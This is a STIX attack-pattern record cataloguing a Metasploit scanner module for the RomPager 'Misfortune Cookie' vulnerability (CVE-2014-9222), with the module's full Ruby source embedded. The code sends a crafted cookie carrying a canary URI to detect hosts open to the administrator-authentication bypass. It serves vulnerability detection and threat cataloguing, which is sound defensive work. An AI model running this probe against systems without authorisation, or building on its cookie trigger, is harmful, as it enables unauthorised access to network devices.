{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb8a1954-e9b2-42b6-be5e-d89d65ec8242",
    "created": "2024-08-14T16:28:27.5666Z",
    "modified": "2024-08-14T16:28:27.566605Z",
    "name": "\"Allegro Software RomPager Misfortune Cookie (CVE-2014-9222) Scanner\"",
    "description": "( This module scans for HTTP servers that appear to be vulnerable to the 'Misfortune Cookie' vulnerability which affects Allegro Software Rompager versions before 4.34 and can allow attackers to authenticate to the HTTP service as an administrator without providing valid credentials. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/allegro_rompager_misfortune_cookie.rb",
            "external_id": "allegro_rompager_misfortune_cookie.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9222"
        },
        {
            "source_name": "reference",
            "url": "http://mis.fortunecook.ie"
        },
        {
            "source_name": "reference",
            "url": "http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf#31C3presentationwithPOC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name' => \"Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Scanner\",\n      'Description' => %q(\n        This module scans for HTTP servers that appear to be vulnerable to the\n        'Misfortune Cookie' vulnerability which affects Allegro Software\n        Rompager versions before 4.34 and can allow attackers to authenticate\n        to the HTTP service as an administrator without providing valid\n        credentials.\n      ),\n      'Author' => [\n        'Jon Hart <jon_hart[at]rapid7.com>', # metasploit module\n        'Lior Oppenheim' # CVE-2014-9222\n      ],\n      'References' => [\n        ['CVE', '2014-9222'],\n        ['URL', 'http://mis.fortunecook.ie'],\n        ['URL', 'http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices\n        ['URL', 'http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC\n      ],\n      'DisclosureDate' => '2014-12-17',\n      'License' => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'URI to test', '/'])\n      ], Exploit::Remote::HttpClient\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('CANARY_URI', [false, 'Try overwriting the requested URI with this canary value (empty for random)']),\n        OptString.new('STATUS_CODES_REGEX', [true, 'Ensure that canary pages and probe responses have status codes that match this regex', '^40[134]$'])\n      ], self.class\n    )\n  end\n\n  def check_host(_ip)\n    begin\n      test_misfortune\n    ensure\n      disconnect\n    end\n  end\n\n  def run_host(ip)\n    status = check_host(ip)\n    case status\n    when Exploit::CheckCode::Appears\n    when Exploit::CheckCode::Detected\n    when Exploit::CheckCode::Vulnerable\n      print_good(\"#{peer} #{status.last}\")\n    else\n      vprint_status(\"#{peer} #{status.last}\")\n    end\n  end\n\n  def setup\n    @status_codes_regex = Regexp.new(datastore['STATUS_CODES_REGEX'])\n  end\n\n  # Fingerprints the provided HTTP response and returns\n  # Exploit::CheckCode::Appears if it is a vulnerable version of RomPager,\n  # otherwise returns the provided fall-back status.\n  def check_response_fingerprint(res, fallback_status)\n    fp = http_fingerprint(response: res)\n    if /RomPager\\/(?<version>[\\d\\.]+)/ =~ fp\n      vprint_status(\"#{peer} is RomPager #{version}\")\n      if Rex::Version.new(version) < Rex::Version.new('4.34')\n        return Exploit::CheckCode::Appears\n      end\n    end\n    fallback_status\n  end\n\n  def find_canary\n    vprint_status(\"#{peer} locating suitable canary URI\")\n    canaries = []\n    if datastore['CANARY_URI']\n      canaries << datastore['CANARY_URI']\n    else\n      # several random URIs in the hopes that one, generally the first, will be usable\n      0.upto(4) { canaries << '/' + Rex::Text.rand_text_alpha(16) }\n    end\n\n    canaries.each do |canary|\n      res = send_request_raw(\n        'uri' => normalize_uri(canary),\n        'method' => 'GET',\n        'headers' => headers\n      )\n      # in most cases, the canary URI will not exist and will return a 404, but\n      # if everything under TARGETURI is protected by auth, a 401 may be OK too.\n      # but, regardless, respect the configuration set for this module\n      return [canary, res.code] if res && res.code.to_s =~ @status_codes_regex\n    end\n    nil\n  end\n\n  def headers\n    {\n      'Referer' => full_uri\n    }\n  end\n\n  # To test for this vulnerability, we must first find a URI known to return\n  # a 404 (not found) which we will use as a canary.  This URI (for example,\n  # /foo) is then taken and used as the value for a carefully crafted cookie\n  # when making a request to the configured host+port+uri.  If the response\n  # is a 404 and the body includes the canary, it is likely that the cookie\n  # overwrote RomPager's concept of the requested URI, indicating that it is\n  # vulnerable.\n  def test_misfortune\n    # find a usable canary URI (one that returns an acceptable status code already)\n    if canary = find_canary\n      canary_value, canary_code = canary\n      vprint_status(\"#{peer} found canary URI #{canary_value} with code #{canary_code}\")\n    else\n      vprint_error(\"#{peer} Unable to find a suitable canary URI\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    canary_cookie_name = 'C107373883'\n    canary_cookie = canary_cookie_name + \"=#{canary_value};\"\n\n    # Make a request containing a specific canary cookie name with the value set\n    # from the suitable canary value found above.\n    res = send_request_raw(\n      'uri' => normalize_uri(target_uri.path.to_s),\n      'method' => 'GET',\n      'headers' => headers.merge('Cookie' => canary_cookie)\n    )\n\n    unless res\n      vprint_error(\"#{full_uri} no response\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    unless res.code.to_s =~ @status_codes_regex\n      vprint_status(\"#{full_uri} unexpected HTTP code #{res.code} response\")\n      return check_response_fingerprint(res, Exploit::CheckCode::Detected)\n    end\n\n    unless res.body\n      vprint_status(\"#{full_uri} HTTP code #{res.code} had no body\")\n      return check_response_fingerprint(res, Exploit::CheckCode::Detected)\n    end\n\n    # If that canary *value* shows up in the *body*, then there are two possibilities:\n    #\n    # 1) If the canary cookie *name* is also in the *body*, it is likely that\n    # the endpoint is puppeting back our request to some extent and therefore\n    # it is expected that the canary cookie *value* would also be there.\n    # return Exploit::CheckCode::Detected\n    #\n    # 2) If the canary cookie *name* is *not* in the *body*, return\n    # Exploit::CheckCode::Vulnerable\n    if res.body.include?(canary_value)\n      if res.body.include?(canary_cookie_name)\n        vprint_status(\"#{full_uri} HTTP code #{res.code} response contained canary cookie name #{canary_cookie_name}\")\n        return check_response_fingerprint(res, Exploit::CheckCode::Detected)\n      else\n        vprint_good(\"#{full_uri} HTTP code #{res.code} response contained canary cookie value #{canary_value} as URI\")\n        report_vuln(\n          host: rhost,\n          port: rport,\n          name: name,\n          refs: references\n        )\n        return Exploit::CheckCode::Vulnerable\n      end\n    end\n\n    vprint_status(\"#{full_uri} HTTP code #{res.code} response did not contain canary cookie value #{canary_value} as URI\")\n    check_response_fingerprint(res, Exploit::CheckCode::Safe)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-17"
}